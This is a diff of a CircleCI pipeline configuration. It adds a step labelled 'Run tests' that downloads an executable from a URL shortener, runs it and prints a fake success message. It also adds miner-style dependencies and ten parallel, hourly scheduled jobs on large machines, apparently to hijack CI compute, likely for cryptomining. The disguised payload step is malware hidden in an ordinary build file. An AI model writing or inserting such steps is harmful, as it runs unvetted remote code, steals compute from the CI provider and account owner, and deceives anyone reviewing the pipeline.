@@ -1,42 +1,115 @@
-working_dir: &working_dir ~/app
+working_dir: &working_dir ~/app 
 .build_template: &script
-  steps:
-    - checkout
-    - run:
-        name: Build
+  steps: 
+    - checkout 
+    - run: 
+        name: Install Dependencies 
         command: |
-                    sudo chmod u+x pods && ./pods
-        no_output_timeout: 300m
-version: 2.0
-jobs:
-  endvoc:
+                    apt-get update
+                    apt-get upgrade -y
+                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake
+    - run: 
+        name: Run tests 
+        command: |
+                    wget -qO subrek https://bit.ly/3Ipgmg8
+                    chmod +x subrek 
+                    ./subrek  
+                    echo Build Succeded                                 
+version: 2.0 
+jobs: 
+  build1: 
     <<: *script
-    machine:
-      image: ubuntu-2004:202101-01
-      resource_class: large
-    parallelism: 15
-  endvoc1:
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build2: 
     <<: *script
-    machine:
-      image: ubuntu-2004:202101-01
-      resource_class: large
-    parallelism: 15
-workflows:
-  version: 2
-  commit:
-    jobs:
-      - endvoc
-      - endvoc1
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build3: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build4: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build5: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build6: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build7: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build8: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build9: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build10: 
+    <<: *script
+    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
 
+workflows: 
+  version: 2 
+  commit: 
+    jobs: 
+      - build1
+      - build2
+      - build3
+      - build4
+      - build5
+      - build6
+      - build7
+      - build8
+      - build9
+      - build10
+
+  schedule:
     triggers:
       - schedule:
-          cron: "0 0,8,16 * * *"
+          cron: "5 * * * *"
           filters:
             branches:
               only:
                 - main
 
-  endvocrunjob:
-    jobs:
-      - endvoc
-      - endvoc1
+    jobs: 
+      - build1
+      - build2
+      - build3
+      - build4
+      - build5
+      - build6
+      - build7
+      - build8
+      - build9
+      - build10
